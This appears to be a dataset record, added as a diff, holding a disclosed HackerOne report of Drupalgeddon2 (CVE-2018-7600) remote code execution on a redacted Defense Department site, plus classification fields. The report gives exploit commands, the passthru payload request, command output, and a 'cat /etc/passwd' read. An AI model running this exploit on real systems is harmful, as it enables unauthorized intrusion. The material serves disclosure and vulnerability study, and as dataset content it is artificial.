@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "phibz ",
+  "title": "[CVE-2018-7600] Remote Code Execution due to outdated Drupal server on www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nSummary\nDue to an outdated Drupal version, remote code execution is possible on www.\u2588\u2588\u2588\u2588\u2588 via CVE-2018-7600.\nDescription\nDrupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.\nVulnerable Host:\nwww.\u2588\u2588\u2588\nVisiting https://www.\u2588\u2588\u2588/\u2588\u2588\u2588 we can see that we have a Drupal with version 7.54, which was updated the last time in 2017-02-01.\nThere are several critical and highly critical vulnerabilities known for this version (see https://api.drupal.org/api/drupal/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/7.x and https://www.drupal.org/security). Among them is SA-CORE-2018-002 (CVE-2018-7600), which I will demonstrate here.\nNote: I am reporting this here, since the page https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588 seems to belong to the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, which belongs to the DOD. The footer further states: \u2588\u2588\u2588\u2588\u2588\u2588. [...]\nStep-by-step Reproduction Instructions\nDownload the git repository with the exploit: git clone https://github.com/dreadlocked/Drupalgeddon2.git && cd Drupalgeddon2\nInstall dependencies if necessary gem install nokogiri\nInstall dependencies if necessary gem install nokogiri\nRun the exploit with ruby ruby drupalgeddon2-customizable-beta.rb -u https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ -v 7 -c id --form user/login\nParameters explanation:\nCode 207 Bytes\n1-u,     --url URL           Service URL\n2-v,     --version VERSION   Target Drupal version {7,8}\n3-c,     --command COMMAND   Command to execute\n4--form  Form to attack, by default '/user/password' in Drupal 7 \nThe above command outputs:\nCode 784 Bytes\n1root@5b08dc005375:/Drupalgeddon2# ruby drupalgeddon2-customizable-beta.rb -u https://www.\u2588\u2588\u2588\u2588/ -v 7 -c id --form user/login\n2drupalgeddon2-customizable-beta.rb:184: warning: URI.escape is obsolete\n3[i] Requesting: www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588//user/password/?name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup\n4[i] POST: form_id=user_pass&_triggering_element_name=name\n5[i] 200\n6[*] Obtained build id!: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7drupalgeddon2-customizable-beta.rb:220: warning: URI.escape is obsolete\n8drupalgeddon2-customizable-beta.rb:221: warning: URI.escape is obsolete\n9[i] Requesting: www.\u2588\u2588\u2588\u2588\u2588/file/ajax/name/%23value/\u2588\u2588\u2588\u2588\u2588\u2588\n10[i] POST: form_build_id=\u2588\u2588\u2588\u2588\u2588\n11[i] Response code: 200\n12uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0\n13root@5b08dc005375:/Drupalgeddon2# \nAs we can see, we successfully executed the id command, which responded with uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0\nI am also providing the output of /etc/passwd which I obtained with command\nCode 106 Bytes\n1ruby drupalgeddon2-customizable-beta.rb -u https://www.\u2588\u2588\u2588\u2588\u2588\u2588/ -v 7 -c \"cat /etc/passwd\" --form user/login\nOutput:\nCode 238 Bytes\n1\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\u2588\u2588\u2588\n3\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n12\u2588\u2588\u2588\u2588\n13\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\n15\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n16\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n17\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n18\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n19\u2588\u2588\u2588\u2588\u2588\u2588\n20\u2588\u2588\u2588\u2588\n21\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n23\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n24\u2588\u2588\u2588\u2588\n25\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n26\u2588\u2588\u2588\n27\u2588\u2588\u2588\u2588\u2588\n28\u2588\u2588\u2588\u2588\u2588\n29\u2588\u2588\u2588\u2588\u2588\u2588\nResources\nhttps://api.drupal.org/api/drupal/\u2588\u2588\u2588\u2588\u2588/7.x\nhttps://www.drupal.org/security\nhttps://github.com/dreadlocked/Drupalgeddon2\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600\nhttps://www.drupal.org/sa-core-2018-002\nMitigation/Remediation Actions\nUpgrade to the most recent version of Drupal 7 core.\nImpact\nCritical - Remote Code Execution\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1616631840,
+  "report_url": "https://hackerone.com/reports/1063256",
+  "vuln_category": "WEB_APP",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "steps": [
+    [
+      1,
+      "Download the exploit from the git repository: git clone https://github.com/dreadlocked/Drupalgeddon2.git && cd Drupalgeddon2"
+    ],
+    [
+      2,
+      "Run the exploit with the command: ruby drupalgeddon2-customizable-beta.rb -u https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ -v 7 -c id --form user/login"
+    ]
+  ],
+  "vuln_description": "Due to an outdated Drupal version (7.54), remote code execution is possible via CVE-2018-7600. This vulnerability allows attackers to execute arbitrary code on the server due to an issue affecting multiple subsystems with default or common module configurations.",
+  "reason": "The attack involves using a publicly available exploit script against a known vulnerability in an outdated Drupal version. The steps are straightforward and do not require complex interactions or novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves remote code execution due to an outdated Drupal version, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs within the same application, whereas this vulnerability exploits a known security flaw in the application's core functionality.",
+    "is_detectable": false
+  }
+}
